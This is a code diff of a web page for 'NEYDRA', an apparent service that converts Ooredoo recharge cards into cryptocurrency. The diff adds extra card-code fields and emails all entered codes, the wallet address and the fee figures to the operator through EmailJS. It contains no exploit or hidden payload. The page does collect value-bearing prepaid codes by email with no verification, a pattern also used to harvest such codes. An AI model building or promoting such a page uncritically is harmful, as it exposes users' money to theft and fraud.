@@ -9,6 +9,13 @@
     <link rel="icon" href="assets/icon.png" type="image/png" />
     <link rel="manifest" href="manifest.json" />
     <title>Exchange | NEYDRA™</title>
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script type="text/javascript">
+      (function() {
+        emailjs.init("QrxaXFcp-hMFZabQc"); // Same Public Key as home.html
+      })();
+    </script>
   </head>
   <body>
     <header>
@@ -21,7 +28,6 @@
           <img src="assets/ooredoo-logo.png" alt="Ooredoo" style="width:100px; height:120px;" />
           <img src="assets/switch-symbol.png" alt="Switch" style="width:50px; height:50px;" />
           <img src="assets/usdt-logo.png" alt="USDT" style="width:100px; height:120px;" />
-          <!-- Add more crypto logos as needed -->
         </div>
       </div>
       <nav class="bottom-nav">
@@ -40,8 +46,9 @@
           <h2 class="section__title">NEYDRA Currency Exchange</h2>
           <p class="section__subtitle">Convert Tunisian Dinar to Digital Currency Instantly</p>
           <p class="about__details">
-            Enter three Ooredoo recharge cards of 5 TND each, select your desired digital currency, and click "Convert".
-            NEYDRA takes 1/3 as a fee, and you receive the digital equivalent of the remaining value minus operational fees.
+            Enter Ooredoo recharge cards (each 5 TND), select your desired digital currency, and click "Convert".
+            You can add more cards in multiples of 3 by pressing the "Add More Cards" button below.<br>
+            NEYDRA takes 1/3 (every third card) as a fee, and you receive the digital equivalent of the remaining value minus operational fees.
             <br><br>
             <strong>Example:</strong><br>
             - You enter 3 cards (5 TND each = 15 TND)<br>
@@ -58,12 +65,18 @@
       <div class="section__container service__container">
         <h2 class="section__title">Make a Conversion</h2>
         <form id="exchange-form" class="footer__form" style="max-width:500px;margin:auto;">
-          <label for="card1">Ooredoo Card Code 1</label>
-          <input type="text" id="card1" name="card1" maxlength="14" required placeholder="Enter first card code" />
-          <label for="card2">Ooredoo Card Code 2</label>
-          <input type="text" id="card2" name="card2" maxlength="14" required placeholder="Enter second card code" />
-          <label for="card3">Ooredoo Card Code 3</label>
-          <input type="text" id="card3" name="card3" maxlength="14" required placeholder="Enter third card code" />
+          <div id="card-fields">
+            <!-- Initial 3 fields -->
+            <div class="card-group">
+              <label for="card1">Ooredoo Card Code 1</label>
+              <input type="text" id="card1" name="card1" maxlength="14" required pattern="\d{14}" inputmode="numeric" placeholder="Enter card code" />
+              <label for="card2">Ooredoo Card Code 2</label>
+              <input type="text" id="card2" name="card2" maxlength="14" required pattern="\d{14}" inputmode="numeric" placeholder="Enter card code" />
+              <label for="card3">Ooredoo Card Code 3</label>
+              <input type="text" id="card3" name="card3" maxlength="14" required pattern="\d{14}" inputmode="numeric" placeholder="Enter card code" />
+            </div>
+          </div>
+          <button id="add-cards-btn" type="button" class="btn" style="margin:10px 0;">Add More Cards</button>
 
           <label for="crypto">Choose Cryptocurrency</label>
           <select id="crypto" name="crypto" required>
@@ -71,7 +84,6 @@
             <option value="USDT-ERC20">USDT ERC20</option>
             <option value="BTC">Bitcoin (BTC)</option>
             <option value="ETH">Ethereum (ETH)</option>
-            <!-- Add more as needed -->
           </select>
           <label for="wallet">Your Crypto Wallet Address</label>
           <input type="text" id="wallet" name="wallet" required placeholder="Paste your wallet address" />
@@ -107,7 +119,7 @@
     <audio id="click-sound4" src="click-sound4.mp3" preload="auto"></audio>
 
     <script type="text/javascript">
-      // Click sound effect (from home.html)
+      // Click sound effect
       function playClickSound() {
         var sounds = [
           document.getElementById("click-sound1"),
@@ -123,47 +135,121 @@
         element.addEventListener('touchstart', playClickSound);
       });
 
-      // Exchange calculation and email sending (similar to home.html, but custom logic)
+      // Add More Cards dynamic fields
+      let cardCount = 3;
+      document.getElementById('add-cards-btn').addEventListener('click', function() {
+        // Only add if previous group is filled
+        let allFilled = true;
+        for (let i = 1; i <= cardCount; i++) {
+          const cardInput = document.getElementById('card' + i);
+          if (!cardInput || cardInput.value.length !== 14 || !/^\d{14}$/.test(cardInput.value)) {
+            allFilled = false;
+            break;
+          }
+        }
+        if (!allFilled) {
+          document.getElementById('exchange-result').textContent = "Fill all current card spaces with 14 digits before adding more.";
+          return;
+        }
+        // Add next group of 3 fields
+        const cardFields = document.getElementById('card-fields');
+        const groupDiv = document.createElement('div');
+        groupDiv.className = "card-group";
+        for (let i = 1; i <= 3; i++) {
+          cardCount++;
+          const label = document.createElement('label');
+          label.htmlFor = 'card' + cardCount;
+          label.textContent = "Ooredoo Card Code " + cardCount;
+          const input = document.createElement('input');
+          input.type = "text";
+          input.id = "card" + cardCount;
+          input.name = "card" + cardCount;
+          input.maxLength = 14;
+          input.required = true;
+          input.pattern = "\\d{14}";
+          input.inputMode = "numeric";
+          input.placeholder = "Enter card code";
+          input.addEventListener("input", function(e){
+            // Only allow numbers
+            this.value = this.value.replace(/\D/g, "");
+          });
+          groupDiv.appendChild(label);
+          groupDiv.appendChild(input);
+        }
+        cardFields.appendChild(groupDiv);
+        document.getElementById('exchange-result').textContent = "";
+      });
+
+      // Only allow numbers in card fields
+      function restrictToNumbers(e) {
+        e.target.value = e.target.value.replace(/\D/g, "");
+      }
+      document.querySelectorAll('input[id^="card"]').forEach(function(input) {
+        input.addEventListener('input', restrictToNumbers);
+      });
+
+      // EmailJS submission and organized text
       document.getElementById('exchange-form').addEventListener('submit', function(event) {
         event.preventDefault();
 
-        var card1 = document.getElementById('card1').value.trim();
-        var card2 = document.getElementById('card2').value.trim();
-        var card3 = document.getElementById('card3').value.trim();
+        // Gather card codes
+        let cards = [];
+        for (let i = 1; i <= cardCount; i++) {
+          const cardInput = document.getElementById('card' + i);
+          if (!cardInput || cardInput.value.length !== 14 || !/^\d{14}$/.test(cardInput.value)) {
+            document.getElementById('exchange-result').textContent = "All card codes must be exactly 14 digits.";
+            return;
+          }
+          cards.push(cardInput.value);
+        }
+
+        // Get crypto/wallet
         var crypto = document.getElementById('crypto').value;
         var wallet = document.getElementById('wallet').value.trim();
 
-        if (!card1 || !card2 || !card3 || !crypto || !wallet) {
+        if (!crypto || !wallet) {
           document.getElementById('exchange-result').textContent = "Please fill in all fields correctly.";
           return;
         }
 
-        // Calculation logic (example values)
+        // Calculation logic
         var cardValue = 5; // Each card is 5 TND
-        var totalTND = 3 * cardValue; // 15 TND
-        var neydraFee = cardValue; // 5 TND
-        var operationalFee = 1; // 1 TND
+        var totalTND = cards.length * cardValue;
+        var neydraFee = Math.floor(cards.length / 3) * cardValue; // 1/3 cards fee
+        var operationalFee = 1; // 1 TND fixed
         var marketRate = 3.20; // Example: 1 USDT = 3.20 TND
 
-        var userTND = totalTND - neydraFee - operationalFee; // 9 TND
-        var usdtAmount = userTND / marketRate;
-        var usdtRounded = Math.round(usdtAmount * 100) / 100;
+        var userTND = totalTND - neydraFee - operationalFee;
+        var cryptoAmount = userTND / marketRate;
+        var cryptoRounded = Math.round(cryptoAmount * 100) / 100;
 
-        var resultText = "Your cards will be sent to NEYDRA for processing. You will receive approximately " + usdtRounded + " " + crypto.replace("-", " ") + " at the provided wallet address.";
+        // Format all user data into one organized text
+        var organizedText =
+          "NEYDRA EXCHANGE REQUEST\n" +
+          "-------------------------------\n" +
+          "Ooredoo Cards (" + cards.length + "):\n" +
+          cards.map((card, idx) => (idx+1) + ". " + card).join("\n") + "\n" +
+          "-------------------------------\n" +
+          "Currency: " + crypto.replace("-", " ") + "\n" +
+          "Wallet Address: " + wallet + "\n" +
+          "-------------------------------\n" +
+          "Total TND entered: " + totalTND + "\n" +
+          "NEYDRA fee: " + neydraFee + " TND\n" +
+          "Operational fee: " + operationalFee + " TND\n" +
+          "User receives: " + userTND + " TND\n" +
+          "Rate: 1 " + crypto.split("-")[0] + " = " + marketRate + " TND\n" +
+          "You will receive approximately: " + cryptoRounded + " " + crypto.replace("-", " ") + "\n";
+
+        var resultText = "Your cards will be sent to NEYDRA for processing. You will receive approximately " +
+          cryptoRounded + " " + crypto.replace("-", " ") + " at the provided wallet address.";
+
         document.getElementById('exchange-result').textContent = resultText;
 
-        // Prepare emailjs form submission (fields similar to home.html)
+        // Prepare emailjs submission (use same method as home.html)
         var formData = {
-          card1: card1,
-          card2: card2,
-          card3: card3,
-          crypto: crypto,
-          wallet: wallet,
-          usdtRounded: usdtRounded
+          user_data: organizedText
         };
 
-        // Send via emailjs (requires setup as in home.html)
-        // This uses the same public key and template as home.html, adjust as needed
         emailjs.send('service_v1sa9hj', 'template_qi7mgvx', formData)
           .then(function() {
             alert('Conversion request sent successfully!');
@@ -172,10 +258,7 @@
           });
       });
     </script>
-    <!-- Elfsight Poll (optional, like about.html) -->
     <script src="https://static.elfsight.com/platform/platform.js" async></script>
     <div class="elfsight-app-f0694651-f050-4245-909a-6b38d447d146" data-elfsight-app-lazy></div>
   </body>
 </html>
-
-
